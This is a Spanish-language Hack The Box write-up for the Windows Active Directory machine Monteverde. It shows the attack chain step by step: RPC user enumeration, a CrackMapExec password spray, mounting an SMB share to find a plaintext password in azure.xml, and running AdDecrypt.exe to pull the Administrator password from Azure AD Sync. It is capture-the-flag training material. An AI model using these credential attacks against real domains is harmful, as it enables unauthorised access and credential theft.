---
title:  "Monteverde Writeup [ES] - HackTheBox"
date:   2022-02-16 13:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [easy, windows, active-directory, azure]
image:
  src: /images/HTB/Monteverde/00-banner.png
  width: 620
  height: 410
---

# Resumen

[Monteverde](https://app.hackthebox.com/machines/223) es una máquina **Windows** de dificultad media de la plataforma de [Hack The Box](https://app.hackthebox.com/), incluye conceptos de explotación de Azure AD Sync y enumeración básica.

Se iniciará obteniendo información desde el servicio RPC para enumerar los usuarios del sistema, con los cuales es posible obtener credenciales válidas haciendo un password spray con CrackMapExec. Posteriormente se escalará a un usuario con mayores privilegios al descubrir credenciales en un archivo .xml. Desde aquí se podrá elevar a privilegios de Administrador explotando Azure AD Sync.

![Info](/images/HTB/Monteverde/01-info.png)

# Enumeración

## Rustscan - NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará [Rustscan](https://github.com/RustScan/RustScan), proporcionando comandos de nmap para realizar el escaneo desde un one-liner.

* ```rustscan 10.10.10.172 -- -sC -sV | tee services.nmap```

```plaintext
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.172:53
Open 10.10.10.172:88
Open 10.10.10.172:135
Open 10.10.10.172:139
Open 10.10.10.172:389
Open 10.10.10.172:445
Open 10.10.10.172:464
Open 10.10.10.172:593
Open 10.10.10.172:636
Open 10.10.10.172:3268
Open 10.10.10.172:3269
Open 10.10.10.172:5985
Open 10.10.10.172:9389
Open 10.10.10.172:49667
Open 10.10.10.172:49673
Open 10.10.10.172:49674
Open 10.10.10.172:49676
Open 10.10.10.172:49696
Open 10.10.10.172:49962
```
Desde el output podemos obtener que los servicios: ```LDAP```, ```RPC```, ```SMB```, ```WinRM``` y ```Kerberos``` se encuentran abiertos, los cuales son ideales para comenzar la enumeración. 


## SMB

Comenzando con el servicio ```SMB```, se intenta enumerar información adicional con una autenticación de usuario y contraseña *null*.

![](/images/HTB/Monteverde/02-smb.png)

No es posible enumerar recursos compartidos sin credenciales válidas, pero se obtiene el dominio: **MEGABANK.LOCAL**.

## RPC

Con la ayuda de **rpcclient**, podemos listar información sin necesidad de autenticación. En este caso enumeraremos los usuarios con ```enumdomusers```.

![](/images/HTB/Monteverde/10-rpc-enumdomusers.png)

Y filtraremos el resultado para guardar los usuarios en el archivo ```users.txt```

```bash
rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users.txt
```
* users.txt

![](/images/HTB/Monteverde/15-users.txt.png)

# Usuario - SABatchJobs

Ya en tenencia de usuarios válidos del sistema, lo primero que se intenta es un ataque ```asreproast```. Se ejecuta con las herramientas ```crackmapexec``` y ```GetNPUsers``` respectivamente.

![](/images/HTB/Monteverde/20-asreproast.png)

Al no tener éxito con este método, y como buena práctica, podríamos realizar un password spraying con los usernames obtenidos anteriormente, de tal manera de utilizar cada username como usuario y contraseña en cada combinación.

```bash
cme smb 10.10.10.172 -u users.txt -p users.txt
```
![](/images/HTB/Monteverde/25-password-spray.png)

```plaintext
SABatchJobs:SABatchJobs
```

# Usuario - mhope

Ahora que poseemos credenciales, intentamos nuevamente listar recursos compartidos por **SMB**. Se identifican dos directorios interesantes: **azure_uploads** y **users$**.


![](/images/HTB/Monteverde/30-smb-shares.png)

Entramos a **azure_uploads** y se observa vacío.


![](/images/HTB/Monteverde/33-smb-azure.png)

En el caso del recurso **users$** vemos directorios para cuatro usuarios.


![](/images/HTB/Monteverde/36-smb-users.png)

En lugar de revisar cada uno desde ```smbmap``` u otra herramienta, haremos una montura de todo **users$** en nuestra máquina local. Posteriormente listaremos todo el contenido de manera recursiva con ```tree```.

```bash
mount -t cifs -o username='SABatchJobs',password='SABatchJobs' //10.10.10.172/users$ /mnt/monteverde
```
![](/images/HTB/Monteverde/39-smb-mount.png)

Dentro del directorio **mhope** se encuentra el archivo ```azure.xml``` que contiene una contraseña en texto claro.

* azure.xml

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

```plaintext
mhope:4n0therD4y@n0th3r$
```

# Administrator

Una vez logueados como el usuario ```mhope``` descubrimos que pertenece al grupo **Azure Admins**.

![](/images/HTB/Monteverde/45-net-users-mhope.png)

Adicionalmente, se detecta el servicio **ADSync** ejecutándose en la máquina.

![](/images/HTB/Monteverde/50-services.png)

## Azure AD Sync

Efectuando una búsqueda rápida en internet, encontramos un [post](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) en donde se detalla un método de abusar el servicio **Azure AD Sync** para obtener credenciales de ciertos usuarios. Todo lo necesario se encuentra en el [repositorio de github](https://github.com/VbScrub/AdSyncDecrypt), en donde deberemos descargar ```AdDecrypt.zip``` y subir su contenido a la máquina víctima.

![](/images/HTB/Monteverde/55-sync-files.png)

Posteriormente se debe ir al directorio ```C:\Program Files\Microsoft Azure AD Sync\Bin``` y ejecutar ```AdDecrypt.exe```:

```powershell
C:\Users\mhope\Documents\my_files\AdDecrypt.exe -FullSQL
```

Inmediatemente obtendremos las credenciales del usuario **Administrator**.

![](/images/HTB/Monteverde/60-admin-pass.png)

Y como último paso, entraremos por **WinRM** y listaremos las flags para ingresarlas en la plataforma.

![](/images/HTB/Monteverde/65-admin-login.png)


Esto sería todo para [Monteverde](https://app.hackthebox.com/machines/223).

![](/images/HTB/Monteverde/100-pwned.png)

> ¡Happy Hacking and keep grinding!

# Más información

* [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
* Ippsec - [https://www.youtube.com/watch?v=HTJjPZvOtJ4](https://www.youtube.com/watch?v=HTJjPZvOtJ4)
* S4vitaar - [https://www.youtube.com/watch?v=eY8Sk4pnvOI](https://www.youtube.com/watch?v=eY8Sk4pnvOI)

